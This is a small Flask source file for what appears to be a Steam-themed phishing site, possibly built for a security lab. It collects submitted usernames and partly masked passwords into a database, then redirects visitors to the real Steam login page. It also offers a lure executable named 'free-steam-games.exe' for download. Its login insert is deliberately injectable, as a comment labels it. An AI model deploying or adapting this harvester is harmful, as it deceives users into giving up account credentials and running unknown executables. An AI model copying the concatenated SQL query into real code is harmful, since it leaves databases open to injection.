from flask import Flask, render_template, request, redirect, url_for, send_file
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql+psycopg2://postgres:postgres@postgres/postgres'
db = SQLAlchemy(app)


class logins(db.Model):
    __tablename__ = 'logins'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(), nullable=False)
    password = db.Column(db.String(), nullable=False)

    def __init__(self, username, password):
        self.username = username
        self.password = password


with app.app_context():
    db.create_all()


@app.get('/')
def index():
    return render_template('index.html')


@app.post('/login')
def login():
    ''' process user/pass form data and add to database '''

    username = request.form['username']
    password = request.form['password']
    password = password[0:2] + '*' * (len(password) - 2)
    num_rows = db.session.query(logins).count()
    if num_rows is None:
        num_rows = 0

    # SQL injection vulnerability
    db.session.execute(
        "INSERT INTO logins VALUES(" + str(num_rows+1) + ", '" + username + "', '" + password + "')")

    db.session.commit()

    return redirect('https://store.steampowered.com/login/')

# rout for file download


@app.get('/download')
def download():
    return send_file("free-steam-games.exe", as_attachment=True)


if __name__ == '__main__':
    # sleep for 10 seconds to allow the database to start
    app.run(host='0.0.0.0', port=5000)
